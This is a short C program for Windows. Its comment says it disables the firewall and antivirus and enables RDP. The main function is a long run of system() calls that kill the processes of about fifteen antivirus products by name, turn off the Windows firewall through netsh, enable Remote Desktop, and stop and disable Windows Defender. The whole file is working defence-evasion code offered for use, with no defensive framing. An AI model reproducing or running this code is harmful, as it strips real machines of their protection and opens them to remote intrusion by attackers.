#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <string.h>

/* this for windows system can shutdown firewall
and antivirus and enable rdp */

/*
#define input "runing"

char pass[20];
printf("Enter Password:~$");
scanf("%s",&pass);
if(strcmp(pass,input) == 0)
*/
int main()
{
////////////////////////avg///////////////////
system("tasklist /SVC | find /I ""avg"" ");
system("taskkill /F /IM ""avg*"" ");
system("taskkill /F /IM ""fixcfg*"" ");
///////////////////////avast///////////////////////
system("tasklist /SVC | find /I ""ashDisp"" ");
system("taskkill /F /IM ""ashDisp*"" ");
system("taskkill /F /IM ""aswupdsv*"" ");
system("taskkill /F /IM ""ashserv*"" ");
system("taskkill /F /IM ""ashMaisv*"" ");
system("taskkill /F /IM ""ash***sv*"" ");
system("taskkill /F /IM ""ashQuick*"" ");
system("taskkill /F /IM ""sched*"" ");
system("taskkill /F /IM ""ashAvast*"" ");
system("taskkill /F /IM ""VisthUpd*"" ");
system("taskkill /F /IM ""AVASTSS*"" ");
system("taskkill /F /IM ""AVA*"" ");
system("taskkill /F /IM ""ashSimpl*"" ");
system("taskkill /F /IM ""ashCmd*"" ");
system("taskkill /F /IM ""ashSimp2*"" ");
system("taskkill /F /IM ""ashEnhcd*"" ");
//////////////////////////Eset////////////////////
system("tasklist /SVC | find /I ""egui"" ");
system("taskkill /F /IM ""egui*"" ");
//////////////////////////////////////////////
system("tasklist /SVC | find /I ""mcafee"" ");
system("taskkill /F /IM ""mcafee*"" ");
////////////////////////avira/////////////////////
system("tasklist /SVC | find /I ""avgnt"" ");
system("taskkill /F /IM ""avscan*"" ");
system("taskkill /F /IM ""avcenter*"" ");
system("taskkill /F /IM ""avguard*"" ");
system("taskkill /F /IM ""avwsc*"" ");
system("taskkill /F /IM ""avconfig*"" ");
system("taskkill /F /IM ""update*"" ");
system("taskkill /F /IM ""setup*"" ");
system("taskkill /F /IM ""sched*"" ");
system("taskkill /F /IM ""guardgui*"" ");
system("taskkill /F /IM ""avupgsvc*"" ");
system("taskkill /F /IM ""avadmin*"" ");
//////////////////////////////////////////////
system("tasklist /SVC | find /I ""emsisoft"" ");
system("taskkill /F /IM ""emsisoft*"" ");
//////////////////////////////////////////////
system("tasklist /SVC | find /I ""f-secure"" ");
system("taskkill /F /IM ""f-secure*"" ");
//////////////////////////////////////////////
system("tasklist /SVC | find /I ""ikarus"" ");
system("taskkill /F /IM ""ikarus*"" ");
//////////////////////////////////////////////
system("tasklist /SVC | find /I ""symantec"" ");
system("taskkill /F /IM ""symantec*"" ");
//////////////////////////////////////////////
system("tasklist /SVC | find /I ""bitdefender"" ");
system("taskkill /F /IM ""bitdefender*"" ");
//////////////////////////////////////////////
system("tasklist /SVC | find /I ""k7"" ");
system("taskkill /F /IM ""k7*"" ");
//////////////////////kaspersky////////////////////////
system("tasklist /SVC | find /I ""avp"" ");
system("taskkill /F /IM ""avp*"" ");
//////////////////////////////////////////////
system("tasklist /SVC | find /I ""malwarebytes"" ");
system("taskkill /F /IM ""malwarebytes*"" ");
//////////////////////////////////////////////
system("tasklist /SVC | find /I ""panda"" ");
system("taskkill /F /IM ""panda*"" ");
//////////////////firewall////////////////////
system("netsh firewall set opmode disable");
system("netsh advfirewall set profiles state off ");
/////////////////enable RDP////////////////////
system("netsh firewall set service type = remotedesktop mode = enable");
/////////////////windows defender ///////////////////////
system("sc config WinDefend start= disabled");
system("sc stop WinDefend");
////////////////////////restart Pc///////////////////////
//system("shutdown /r");
}
